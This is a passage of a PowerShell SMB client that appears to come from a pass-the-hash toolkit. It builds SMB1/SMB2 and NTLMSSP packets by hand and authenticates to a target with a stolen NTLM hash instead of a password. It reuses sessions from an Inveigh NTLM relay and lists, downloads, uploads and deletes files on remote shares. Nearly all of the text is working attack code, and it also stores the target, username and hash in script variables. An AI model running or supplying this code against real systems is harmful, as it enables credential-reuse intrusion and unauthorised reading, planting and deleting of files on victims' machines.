                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try

                        {

                            $client_stream.Write($client_send,0,$client_send.Length) > $null

                            $client_stream.Flush()    

                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')

                            {

                                $SMB_version = 'SMB1'

                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')

                                {

                                    if($signing_check)

                                    {

                                        Write-Output "[+] SMB signing is required on $Target"

                                        $stage = 'Exit'

                                    }

                                    else

                                    {    

                                        Write-Verbose "[+] SMB signing is required"

                                        $SMB_signing = $true

                                        $session_key_length = 0x00,0x00

                                        $negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }

                                }

                                else

                                {

                                    if($signing_check)

                                    {

                                        Write-Output "[+] SMB signing is not required on $Target"

                                        $stage = 'Exit'

                                    }

                                    else

                                    {    

                                        $SMB_signing = $false

                                        $session_key_length = 0x00,0x00

                                        $negotiate_flags = 0x05,0x82,0x08,0xa0

                                    }

                                }

                            }

                            else

                            {

                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')

                                {

                                    if($signing_check)

                                    {

                                        Write-Output "[+] SMB signing is required on $Target"

                                        $stage = 'Exit'

                                    }

                                    else

                                    {   

                                        if(!$SMB_signing)

                                        {

                                            Write-Verbose "[+] SMB signing is required"

                                        }

                                        $SMB_signing = $true

                                        $session_key_length = 0x00,0x00

                                        $negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }

                                }

                                else

                                {

                                    if($signing_check)

                                    {

                                        Write-Output "[+] SMB signing is not required on $Target"

                                        $stage = 'Exit'

                                    }

                                    else

                                    {    

                                        $SMB_signing = $false

                                        $session_key_length = 0x00,0x00

                                        $negotiate_flags = 0x05,0x80,0x08,0xa0

                                    }

                                }

                            }

                        }

                        catch

                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')

                            {

                                Write-Output "[-] SMB1 negotiation failed"

                                $negoitiation_failed = $true

                                $stage = 'Exit'

                            }

                        }

                    }

                    'NegotiateSMB2'

                    {

                        if($SMB_version -eq 'SMB2.1')

                        {

                            $message_ID = 0

                        }

                        else

                        {

                            $message_ID = 1

                        }

                        $tree_ID = 0x00,0x00,0x00,0x00

                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                        $packet_SMB_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB_data = New-PacketSMB2NegotiateProtocolRequest

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()    

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')

                        {

                            if($signing_check)

                            {

                                Write-Output "[+] SMB signing is required on $target"

                                $stage = 'Exit'

                            }

                            else

                            {

                                if(!$SMB_signing)

                                {

                                    Write-Verbose "[+] SMB signing is required"

                                }

                                $SMB_signing = $true

                                $session_key_length = 0x00,0x00

                                $negotiate_flags = 0x15,0x82,0x08,0xa0

                            }

                        }

                        else

                        {

                            if($signing_check)

                            {

                                Write-Output "[+] SMB signing is not required on $target"

                                $stage = 'Exit'

                            }

                            else

                            {

                                $SMB_signing = $false

                                $session_key_length = 0x00,0x00

                                $negotiate_flags = 0x05,0x80,0x08,0xa0

                            }

                        }

                    }

                    'NTLMSSPNegotiate'

                    { 

                        if($SMB_version -eq 'SMB1')

                        {

                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)

                            {

                                $packet_SMB_header["Flags2"] = 0x05,0x48

                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       

                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate

                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        }

                        else

                        {

                            $message_ID++

                            $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       

                            $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate

                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()    

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'Exit'

                    }

                }

            }

            catch

            {

                Write-Output "[-] $($_.Exception.Message)"

                $negoitiation_failed = $true

            }

        }

        if(!$signing_check -and !$negoitiation_failed)

        {

            $NTLMSSP = [System.BitConverter]::ToString($client_receive)

            $NTLMSSP = $NTLMSSP -replace "-",""

            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")

            $NTLMSSP_bytes_index = $NTLMSSP_index / 2

            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive

            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive

            $session_ID = $client_receive[44..51]

            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]

            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]

            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]

            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"

            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $auth_hostname = (Get-ChildItem -path env:computername).Value

            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)

            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)

            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)

            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]

            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]

            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]

            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]

            $auth_domain_offset = 0x40,0x00,0x00,0x00

            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)

            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)

            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)

            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)

            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5

            $HMAC_MD5.key = $NTLM_hash_bytes

            $username_and_target = $username.ToUpper()

            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)

            $username_and_target_bytes += $auth_domain_bytes

            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)

            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,

                                    0x00,0x00,0x00,0x00 +

                                    $target_time_bytes +

                                    $client_challenge_bytes +

                                    0x00,0x00,0x00,0x00 +

                                    $target_details +

                                    0x00,0x00,0x00,0x00,

                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes

            $HMAC_MD5.key = $NTLMv2_hash

            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)

            {

                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)

                $session_key = $session_base_key

                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256

                $HMAC_SHA256.key = $session_key

            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes

            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]

            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,

                                    0x03,0x00,0x00,0x00,

                                    0x18,0x00,

                                    0x18,0x00 +

                                    $auth_LM_offset +

                                    $NTLMv2_response_length +

                                    $NTLMv2_response_length +

                                    $auth_NTLM_offset +

                                    $auth_domain_length +

                                    $auth_domain_length +

                                    $auth_domain_offset +

                                    $auth_username_length +

                                    $auth_username_length +

                                    $auth_username_offset +

                                    $auth_hostname_length +

                                    $auth_hostname_length +

                                    $auth_hostname_offset +

                                    $session_key_length +

                                    $session_key_length +

                                    $session_key_offset +

                                    $negotiate_flags +

                                    $auth_domain_bytes +

                                    $auth_username_bytes +

                                    $auth_hostname_bytes +

                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +

                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')

            {

                $SMB_user_ID = $client_receive[32,33]

                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)

                {

                    $packet_SMB_header["Flags2"] = 0x05,0x48

                }

                $packet_SMB_header["UserID"] = $SMB_user_ID

                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response

                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      

                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate

                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

            }

            else

            {

                $message_ID++

                $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 $false $message_ID  $process_ID $tree_ID $session_ID

                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response

                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        

                $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth

                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

            }

            try

            {

                $client_stream.Write($client_send,0,$client_send.Length) > $null

                $client_stream.Flush()

                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')

                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')

                    {

                        $script:tmpip = $Target

                        $script:tmpuser = $Username

                        $script:tmphash = $hash

                        Write-Verbose "[+] $output_username successfully authenticated on $Target"

                        Write-Output "[-] SMB1 is only supported with signing check and authentication"

                        $login_successful = $false

                    }

                    else

                    {

                        Write-Output "[!] $output_username failed to authenticate on $Target"

                        $login_successful = $false

                    }

                }

                else

                {

                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')

                    {

                        $script:tmpip = $Target

                        $script:tmpuser = $Username

                        $script:tmphash = $hash

                        Write-Verbose "[+] $output_username successfully authenticated on $Target"

                        $login_successful = $true

                    }

                    else

                    {

                        Write-Output "[!] $output_username failed to authenticate on $Target"

                        $login_successful = $false

                    }

                }

            }

            catch

            {

                Write-Output "[-] $($_.Exception.Message)"

                $login_successful = $false

            }

        }

    }

    try

    {

        if($login_successful -or $inveigh_session)

        {

            if($inveigh_session)

            {

                if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')

                {

                    Write-Output "[*] Pausing due to Inveigh Relay session lock"

                    Start-Sleep -s 2

                }

                $inveigh.session_lock_table[$session] = 'locked'

                $client = $inveigh.session_socket_table[$session]

                $client_stream = $client.GetStream()

                $session_ID = $inveigh.session_table[$session]

                $message_ID =  $inveigh.session_message_ID_table[$session]

                $tree_ID = 0x00,0x00,0x00,0x00

                $SMB_signing = $false

            }

            $path = "\\" + $Target + "\IPC$"

            $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)

            $directory_list = New-Object System.Collections.ArrayList

            $stage = 'TreeConnect'

            while ($stage -ne 'Exit')

            {

                switch($stage)

                {

                    'CloseRequest'

                    {

                        if(!$file_ID)

                        {

                            $file_ID = $client_receive[132..147]

                        }

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $file_ID = ''

                        if($directory_list.Count -gt 0 -and $Action -eq 'Recurse')

                        {

                            $file = $directory_list[0]

                            $root_directory = $file + 0x5c,0x00

                            $create_request_extra_info = 1

                            $stage = 'CreateRequest'

                            if($root_directory.Count -gt 2)

                            {

                                $root_directory_extract = [System.BitConverter]::ToString($root_directory)

                                $root_directory_extract = $root_directory_extract -replace "-00",""

                                if($root_directory.Length -gt 2)

                                {

                                    $root_directory_extract = $root_directory_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

                                    $root_directory_string = New-Object System.String ($root_directory_extract,0,$root_directory_extract.Length)

                                }

                                else

                                {

                                    $root_directory_string = [Char][System.Convert]::ToInt16($file,16)

                                }

                            }

                        }

                        elseif($Action -eq 'Get' -and $action_step -eq 1)

                        {

                            if($share_subdirectory -eq $source_file)

                            {

                                $file = ""

                            }

                            else

                            {

                                $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))

                            }

                            $create_request_extra_info = 1

                            $stage = 'CreateRequest'

                        }

                        elseif($Action -eq 'Delete')

                        {

                            switch($action_step)

                            {

                                0

                                {

                                    if($share_subdirectory -eq $source_file)

                                    {

                                        $file = ""

                                    }

                                    else

                                    {

                                        $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))

                                    }

                                    $create_request_extra_info = 1

                                    $stage = 'CreateRequest'

                                    $action_step++

                                }

                                1

                                {

                                    $stage = 'CreateRequestFindRequest'

                                }

                                3

                                {

                                    $stage = 'TreeDisconnect'

                                }

                            }

                        }

                        elseif($share_subdirectory_start)

                        {

                            $share_subdirectory_start = $false

                            $stage = 'CreateRequestFindRequest'

                        }

                        else

                        {

                            $stage = 'TreeDisconnect'

                        }

                    }

                    'CreateRequest'

                    {

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2CreateRequest $file $create_request_extra_info $source_file_size

                        if($directory_list.Count -gt 0)

                        {

                            $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00

                            $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00

                        }

                        if($Action -eq 'Delete')

                        {

                            switch($action_step)

                            {

                                0

                                {

                                    $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00

                                    $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x00,0x00

                                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00

                                }

                                2

                                {

                                    $packet_SMB2_data["CreateOptions"] = 0x40,0x00,0x20,0x00

                                    $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x01,0x00

                                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00

                                }

                            }

                        }

                        if($Action -eq 'Get')

                        {

                            $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00

                            $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00

                            $packet_SMB2_data["ShareAccess"] = 0x05,0x00,0x00,0x00

                        }

                        if($Action -eq 'Put')

                        {

                            switch($action_step)

                            {

                                0

                                {

                                    $packet_SMB2_data["CreateOptions"] = 0x60,0x00,0x20,0x00

                                    $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00

                                    $packet_SMB2_data["ShareAccess"] = 0x01,0x00,0x00,0x00

                                    $packet_SMB2_data["RequestedOplockLevel"] = 0xff

                                }

                                1

                                {

                                    $packet_SMB2_data["CreateOptions"] = 0x64,0x00,0x00,0x00

                                    $packet_SMB2_data["DesiredAccess"] = 0x97,0x01,0x13,0x00

                                    $packet_SMB2_data["ShareAccess"] = 0x00,0x00,0x00,0x00

                                    $packet_SMB2_data["RequestedOplockLevel"] = 0xff

                                    $packet_SMB2_data["FileAttributes"] = 0x20,0x00,0x00,0x00

                                    $packet_SMB2_data["CreateDisposition"] = 0x05,0x00,0x00,0x00

                                }

                            }

                        }

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data  

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')

                        {

                            $error_code = [System.BitConverter]::ToString($client_receive[15..12])

                            switch($error_code)

                            {

                                'c0-00-01-03'

                                {

                                    $stage = 'Exit'

                                }

                                'c0-00-00-22'

                                {

                                    if($directory_list.Count -gt 0)

                                    {

                                        $directory_list.RemoveAt(0) > $null

                                    }

                                    else

                                    {

                                        $output_message = "[-] Access denied"

                                        $share_subdirectory_start = $false

                                    }

                                    $stage = 'CloseRequest'

                                }

                                'c0-00-00-34'

                                {

                                    if($Action -eq 'Put')

                                    {

                                        $create_request_extra_info = 3

                                        $action_step++

                                        $stage = 'CreateRequest'

                                    }

                                    else

                                    {

                                        $output_message = "[-] File not found"

                                        $stage = 'Exit'

                                    }

                                }

                                'c0-00-00-ba'

                                {

                                    if($Action -eq 'Put')

                                    {

                                        $output_message = "[-] Destination filname must be specified"

                                        $stage = 'CloseRequest'

                                    }

                                }

                                default

                                {

                                    $error_code = $error_code -replace "-",""

                                    $output_message = "[-] Create request error code 0x$error_code"

                                    $stage = 'Exit'

                                }

                            }

                        }

                        elseif($Action -eq 'Delete' -and $action_step -eq 2)

                        {

                            $set_info_request_file_info_class = 0x01

                            $set_info_request_info_level = 0x0d

                            $set_info_request_buffer = 0x01,0x00,0x00,0x00

                            $file_ID = $client_receive[132..147]

                            $stage = 'SetInfoRequest'

                        }

                        elseif($Action -eq 'Get' -and $action_step -ne 1)

                        {

                            switch($action_step)

                            {

                                0

                                {

                                    $file_ID = $client_receive[132..147]

                                    $action_step++

                                    $stage = 'CloseRequest'

                                }

                                2

                                {

                                    if($file_size -lt 4096)

                                    {

                                        $read_request_length = $file_size

                                    }

                                    else

                                    {

                                        $read_request_length = 4096

                                    }

                                    $read_request_offset = 0

                                    $file_ID = $client_receive[132..147]

                                    $action_step++

                                    $stage = 'ReadRequest'

                                }

                                4

                                {

                                    $header_next_command = 0x68,0x00,0x00,0x00

                                    $query_info_request_info_type_1 = 0x01

                                    $query_info_request_file_info_class_1 = 0x07

                                    $query_info_request_output_buffer_length_1 = 0x00,0x10,0x00,0x00

                                    $query_info_request_input_buffer_offset_1 = 0x68,0x00

                                    $query_info_request_buffer_1 = 0

                                    $query_info_request_info_type_2 = 0x01

                                    $query_info_request_file_info_class_2 = 0x16

                                    $query_info_request_output_buffer_length_2 = 0x00,0x10,0x00,0x00

                                    $query_info_request_input_buffer_offset_2 = 0x68,0x00

                                    $query_info_request_buffer_2 = 0

                                    $file_ID = $client_receive[132..147]

                                    $action_step++

                                    $stage = 'QueryInfoRequest'

                                }

                            }

                        }

                        elseif($Action -eq 'Put')

                        {

                            switch($action_step)

                            {

                                0

                                {

                                    if($Action -eq 'Put')

                                    {

                                        $script:sign = '1'

                                        $output_message = "Destination file exists"

                                        $stage = 'CloseRequest'

                                    }

                                }

                                1

                                {

                                    $file_ID = $client_receive[132..147]

                                    $action_step++

                                    $header_next_command = 0x70,0x00,0x00,0x00

                                    $query_info_request_info_type_1 = 0x02

                                    $query_info_request_file_info_class_1 = 0x01

                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00

                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00

                                    $query_info_request_buffer_1 = 8

                                    $query_info_request_info_type_2 = 0x02

                                    $query_info_request_file_info_class_2 = 0x05

                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00

                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00

                                    $query_info_request_buffer_2 = 1

                                    $stage = 'QueryInfoRequest'

                                }

                            }

                        }

                        elseif($share_subdirectory_start)

                        {

                            $file_ID = $client_receive[132..147]

                            $stage = 'CloseRequest'

                        }

                        elseif($directory_list.Count -gt 0 -or $action_step -eq 1)

                        {

                            $stage = 'FindRequest'

                        }

                        else

                        {

                            $header_next_command = 0x70,0x00,0x00,0x00

                            $query_info_request_info_type_1 = 0x02

                            $query_info_request_file_info_class_1 = 0x01

                            $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00

                            $query_info_request_input_buffer_offset_1 = 0x00,0x00

                            $query_info_request_buffer_1 = 8

                            $query_info_request_info_type_2 = 0x02

                            $query_info_request_file_info_class_2 = 0x05

                            $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00

                            $query_info_request_input_buffer_offset_2 = 0x00,0x00

                            $query_info_request_buffer_2 = 1

                            $file_ID = $client_receive[132..147]

                            $stage = 'QueryInfoRequest'

                            if($share_subdirectory)

                            {

                                $share_subdirectory_start = $true

                            }

                        }

                    }

                    'CreateRequestFindRequest'

                    {

                        $message_ID++

                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2CreateRequest $file 1

                        $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00

                        $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        $packet_SMB2_header["NextCommand"] = [System.BitConverter]::GetBytes($SMB2_header.Length + $SMB2_data.Length)

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data  

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $message_ID++

                        $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2b_header["NextCommand"] = 0x68,0x00,0x00,0x00

                        if($SMB_signing)

                        {

                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      

                        }

                        else

                        {

                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00

                        }

                        $packet_SMB2b_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff 0x00,0x00,0x00,0x00,0x00,0x00

                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header

                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2b_header + $SMB2b_data 

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2b_header["Signature"] = $SMB2_signature

                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header

                        }

                        $message_ID++

                        $packet_SMB2c_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)

                        {

                            $packet_SMB2c_header["Flags"] = 0x0c,0x00,0x00,0x00      

                        }

                        else

                        {

                            $packet_SMB2c_header["Flags"] = 0x04,0x00,0x00,0x00

                        }

                        $packet_SMB2c_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff

                        $packet_SMB2c_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00

                        $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header

                        $SMB2c_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_data    

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length + $SMB2c_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length + $SMB2c_data.Length)

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2c_header + $SMB2c_data 

